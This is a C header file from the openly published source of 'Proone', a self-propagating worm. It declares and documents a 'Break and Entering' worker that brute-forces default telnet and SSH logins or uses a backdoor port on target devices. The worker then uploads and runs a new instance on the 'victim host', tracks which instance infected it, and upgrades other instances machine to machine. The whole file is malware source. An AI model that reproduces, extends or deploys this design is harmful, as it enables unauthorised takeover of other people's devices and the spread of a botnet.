/** \file The Break and Entering Worker
 *
 * The Break and Entering worker is a task unit. Its purpose is to break into a
 * device on the network using vulnerabilities(namely using default login
 * credentials) to inject a new instnace of Proone. It's also responsible for
 * M2M communications with other existing Proone instances. The instantiation
 * requires parametres of the target host, the vulnerabilities to try and the
 * data required for the vulnerabilities(namely the cred dict).
 */
/*
* Copyright (c) 2019-2021 David Timber <mieabby@gmail.com>
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/
#pragma once
#include <stdio.h>
#include <stddef.h>
#include <inttypes.h>
#include <stdbool.h>

#include <mbedtls/ssl.h>
#include <mbedtls/ctr_drbg.h>

#include "pth.h"
#include "protocol.h"
#include "pack.h"
#include "cred_dict.h"


/* forward declarations */
struct prne_bne; // opaque
typedef struct prne_bne_param prne_bne_param_t;
typedef struct prne_bne prne_bne_t;
typedef struct prne_bne_result prne_bne_result_t;

/**
 * \brief Vulnerability Vector Enum
 * \note Suitable storage type: \c int8_t
 * \note Range: ( \c PRNE_BNE_V_NONE, \c NB_PRNE_BNE_V )
*/
enum prne_bne_vector {
	PRNE_BNE_V_NONE = -1, // Null value
	/**
	 * \brief The Heartbeat local backdoor vector
	 * \note The bne process is determined successful if a TLS connection to the
	 *	lbd port can be established. Anything that's done using the connection
	 *	is extra(M2M operations) and is not returned in the result object.
	 * \note This should be the first vector the worker tries in the normal use
	 *	case.
	 */
	PRNE_BNE_V_HTBT,
	/**
	 * \brief The telnet brute force login vector
	 * \note The connection is handed over to the internal shell macro once
	 *	login has been successful and a shell has been opened.
	 */
	PRNE_BNE_V_BRUTE_TELNET,
	/**
	 * \brief The SSH brute force login vector
	 * \note Once a user name has been chosen and used for the connection, only
	 *	the credentials with the same user name are tried until the worker runs
	 *	out of the credentials or loses the connection.
	 * \note The connection is handed over to the internal shell macro once
	 *	login has been successful and a shell has been opened.
	 */
	PRNE_BNE_V_BRUTE_SSH,
	NB_PRNE_BNE_V // Meta value: number of vectors
};
typedef enum prne_bne_vector prne_bne_vector_t;

/**
 * \brief The BNE worker parameter object
 * \warning The referenced objects must be valid until the worker is freed.
 * \see \c prne_init_bne_param()
 * \see \c prne_free_bne_param()
 */
struct prne_bne_param {
	// The cred dict to use for brute force login (optional)
	const prne_cred_dict_t *cred_dict;
	// The SSL config object for authoritive heartbeat client connections
	// (optional)
	mbedtls_ssl_config *htbt_ssl_conf;
	/**
	 * \brief The vulnerability vector list
	 *
	 * \note
	 * The worker will try the vulnerabilities specified in the list one by one
	 * in order. If BNE has been carried out successfully via a vector,
	 * the worker exits and the rest of the vectors in the list are not tried.
	 * Usually, you'd want to specify \c PRNE_BNE_V_HTBT first.
	 */
	struct {
		const prne_bne_vector_t *arr;
		size_t cnt;
	} vector;
	// Callback functions
	struct {
		/**
		 * \brief The destination file name of the Proone executable (required)
		 * \param ctx \c cb_ctx
		 * \return A pointer to a null-terminated string.
		 * \retval Null to indicate an unsuccessful operation. \c errno
		 * 	should be set to an appropriate value.
		 *
		 * \note The returned memory must be writable and freeable with
		 * 	\c prne_free() The worker scrubs the string and frees it immediately
		 * 	after use.
		 * \note
		 * This is the name of the file the shell macro will create and appear
		 * on the process table on the victim host. Usually taken from
		 * \c PRNE_DATA_KEY_EXEC_NAME
		 */
		char *(*exec_name)(void *ctx);
		/**
		 * \brief The name of the upload lock file (optional)
		 * \param ctx \c cb_ctx
		 * \return A pointer to a null-terminated string.
		 * \retval Null to indicate an unsuccessful operation with \c errno set
		 * 	to an appropriate value.
		 * \retval Null to disable the use of the lock file with \c errno set to
		 * 	zero.
		 *
		 * \note The returned memory must be writable and freeable with
		 * 	\c prne_free() The worker scrubs the string and frees it immediately
		 * 	after use.
		 * \note
		 * To prevent executable upload from multiple instances, the worker
		 * attempts to create an empty file in the top directory of the mount
		 * point before proceeding to data transfer. If the file already exists,
		 * the worker assumes that another instance has already begun to upload
		 * the executable and exits. The "upload guard", a shell function that
		 * cleans up all the files created during the process including the lock
		 * file, is launched before the upload process to give other instances
		 * a chance to try again in the event of connection loss.
		 */
		char *(*bne_lock_name)(void *ctx);
		/**
		 * \brief Enter data dictionary callback (optional)
		 * \param ctx \c cb_ctx
		 * \retval False if unable to enter the data dictionary with \c errno
		 * 	set to an appropriate value.
		 * \retval True otherwise.
		 *
		 * \note \c exit_dd() is guaranteed to be invoked if returned true.
		 * \note The function must always return true if \c cred_dict does not
		 * 	have to be processed at all.
		 * \note
		 * This function is invoked by the worker before any data in
		 * \c cred_dict is referenced so that the user implementation can
		 * transform the data in a usable form. If \c cred_dict is pointed to
		 * the dvault data, this callback function is where unmasking should
		 * take place.
		 */
		bool (*enter_dd)(void *ctx);
		/**
		 * \brief Exit data dictionary callback (optional)
		 * \param ctx \c cb_ctx
		 *
		 * \note
		 * Processing of \c cred_dict to the original form, if transformed in
		 * \c enter_dd(), should take place in this callback function. The
		 * function is invoked by the worker when it is done with the data from
		 * \c cred_dict. The function is guaranteed to be invoked by the worker
		 * in case \c enter_dd() has returned true beforehand.
		 */
		void (*exit_dd)(void *ctx);
		/**
		 * \brief Process uptime enquiry callback (optional)
		 * \param ctx \c cb_ctx
		 * \return The elapsed real time of the parent process in seconds.
		 * \retval \c UINT64_MAX to disable the uptime check for M2M binary
		 * 	upgrade of the local instance or if process uptime information is
		 * 	unavailable.
		 * \see \c BNE_M2M_UPBIN_INT
		 *
		 * \note
		 * The worker uses the process uptime to determine if it's too soon to
		 * perform M2M binary upgrade on either of the instances. The process
		 * uptime should be computed and returned via the callback function.
		 */
		uint64_t (*uptime)(void *ctx);
		/**
		 * \brief Proone version comparator callback (optional)
		 * \param ctx \c cb_ctx
		 * \param uuid The version uuid of the remote instance.
		 * \retval A negative integer if \p uuid is newer than that of the local
		 * 	instance.
		 * \retval Zero if \p uuid is identical to that of the local instance.
		 * \retval A positive integer if \p uuid is older than that of the local
		 * 	instance.
		 *
		 * \note Always returning zero effectively disables M2M binary upgrade.
		 * \note
		 * This callback function is used by the worker to determine if either
		 * of the instances has to be updated to the newer version. Note that
		 * the version system of Proone does not use linear numeric values to
		 * represent version for obsecurity. For this reason, every executable
		 * should carry a version matrix containing the version uuids older than
		 * that of itself.
		 */
		int (*vercmp)(void *ctx, const uint8_t *uuid);
		/**
		 * \brief Create temporary file request callback (optional)
		 * \param ctx \c cb_ctx
		 * \param flags \c open() flags.
		 * \param mode \c open() mode.
		 * \param req_size The initial size of the temporary file.
		 * \param path (optional)null-terminated string, the path to the
		 * 	temporary file created. If used, the memory must be freeable with
		 * 	\c prne_free()
		 * \return An open and valid file descriptor upon successful creation of
		 * 	temporary file.
		 * \retval A negative integer with \c errno set to an appropriate value.
		 *
		 * \note
		 * This is the callback function that the worker uses to create
		 * temporary files. The user implementation should determine the path of
		 * the new temporary file using its own resources. The file should be
		 * grown to \p req_size using syscalls like \c fallocate(). The file may
		 * contain "holes". Any \c errno resulted during the process must be
		 * preserved when the function has returned so that the worker can
		 * respectively return the error in the \c prne_bne_result_t object.
		 * A temporary file is created to download a new version of executable.
		 */
		int (*tmpfile)(
			void *ctx,
			const int flags,
			const mode_t mode,
			size_t req_size,
			char **path);
		/**
		 * \brief Binary upgrade event callback (optional)
		 * \param ctx \c cb_ctx
		 * \param path The path to the new executable.
		 * \param cmd The command line arguments without the first element,
		 * 	which is the path to the executable.
		 * \retval True if the new executable is accepted and no error has
		 * 	occurred during the process.
		 * \retval False otherwise with \c errno set to explain why the
		 * executable has not been accepted.
		 *
		 * \note
		 * This function is called by the worker upon the successful download of
		 * a new version of executable from another instance. The mode of the
		 * file at \p path is set so that it is executable. \p cmd is the
		 * command line options to be used when launching the executable. Note
		 * that an array for \c exec() should be composed as the first element
		 * of \p cmd is not \p path.
		 */
		bool (*upbin)(void *ctx, const char *path, const prne_htbt_cmd_t *cmd);
	} cb;
	/**
	 * \brief Callback context object
	 * \note The object for the callback functions(ctx param).
	 */
	void *cb_ctx;
	const prne_rcb_param_t *rcb; // The recombination context (required)
	/**
	 * \brief The origin instance uuid (optional)
	 * \note The length of the array must be 16 or longer.
	 * \note If set to null, a blank command line option will be used
	 * 	effectively leaving the value in the new instance as the initial value,
	 * 	all zero.
	 * \note The all-zero uuid is generally for the index case instance(P0).
	 * \note When launching Proone on a new host, the uuid of the instance that
	 * 	infected the host can be passed as a command line option. The uuid of
	 * 	the instance in which the worker runs should be used.
	 */
	const uint8_t *org_id;
	/**
	 * \brief The IP address of the target host
	 * \note The Proone IPv6 convention is used - when the addresses of both
	 * 	versions are specified, a socket will be opened for each version and
	 * 	whichever becomes available first will be used.
	 */
	prne_ip_addr_t subject;
	/**
	 * \brief The maximum number of login attempts
	 * \note Set to zero to unlimit the number of login attempps.
	 * \note Use this param to limit the number of login attempts per vector.
	 */
	unsigned int login_attempt;
};

/**
 * \brief The BNE result object (read-only)
 * \note An instance of the BNE result object is returned via \c pth_join().
 * \note The object is part of the worker instance and will be freed when the
 * 	worker is freed.
 */
struct prne_bne_result {
	struct {
		char *id;
		char *pw;
	} cred;
	const prne_ip_addr_t *subject;
	int err;
	prne_bne_vector_t vec;
	prne_pack_rc_t prc;
	prne_bin_host_t bin_host;
	prne_bin_host_t bin_used;
	bool ny_instance;
};

/**
 * \brief Initialisation function
 * \see [/doc/impl.md#Resource Allocation](/doc/impl.md#resource_allocation)
 */
void prne_init_bne_param (prne_bne_param_t *p);
/**
 * \brief Deinitialisation function
 * \see [/doc/impl.md#Resource Allocation](/doc/impl.md#resource_allocation)
 */
void prne_free_bne_param (prne_bne_param_t *p);

/**
 * \brief Convert the enum value to a descriptive string
 * \return A pointer to the string from the read-only static string pool.
 * \retval Null if \p v is out of bounds of the valid range with \c errno set to
 * 	\c EINVAL
 */
const char *prne_bne_vector_tostr (const prne_bne_vector_t v);

/**
 * \brief Allocate and start an instance of the BNE worker
 * \param w The pointer to the pth worker object.
 * \param ctr_drbg An instance of CTR DRBG for initialising internal PRNGs.
 * \param param The pointer to the BNE worker parameter object.
 * \return The pointer to the new instance of the BNE worker.
 * \retval NULL on error with \c errno set.
 * \note The worker keeps its own copy of \p param. The memory used for \p param
 * 	can be freed after the function returns.
 * \note The thread can be controlled with \p w. The interruption of the worker,
 * 	however, is not implemented.
 */
prne_bne_t *prne_alloc_bne (
	prne_worker_t *w,
	mbedtls_ctr_drbg_context *ctr_drbg,
	const prne_bne_param_t *param);
/**
 * \brief Get the target host parameter of the BNE worker
 * \return A pointer to the internal \c prne_ip_addr_t object.
 */
const prne_ip_addr_t *prne_bne_get_subject (const prne_bne_t *bne);
